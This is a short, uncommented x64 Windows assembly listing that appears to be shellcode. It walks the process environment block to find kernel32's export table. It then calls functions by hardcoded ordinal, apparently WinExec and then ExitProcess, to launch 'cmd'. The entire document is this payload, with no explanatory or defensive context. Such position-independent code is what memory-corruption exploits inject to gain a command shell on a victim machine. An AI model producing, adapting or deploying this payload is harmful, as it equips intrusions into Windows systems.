cdq
mov rax,[gs:rdx+0x60]
mov rax,[rax+0x18]
mov rsi,[rax+0x10]
lodsq
mov rsi,[rax]
mov rdi,[rsi+0x30]
xor rbx,rbx
xor rsi,rsi
mov ebx,[rdi+0x3c]
add rbx,rdi
mov dl,0x88
mov ebx,[rbx+rdx]
add rbx,rdi
mov esi,[rbx+0x1c]
add rsi,rdi
cdq
mov dx,1319
mov eax,[rsi+rdx*4]
add rax,rdi
jmp c

exec:
pop rcx
cdq
inc rdx
call rax
cdq
mov dx,297
mov eax,[rsi+rdx*4]
add rax,rdi
xor rcx,rcx
call rax

c:
call exec
db 'cmd',0,0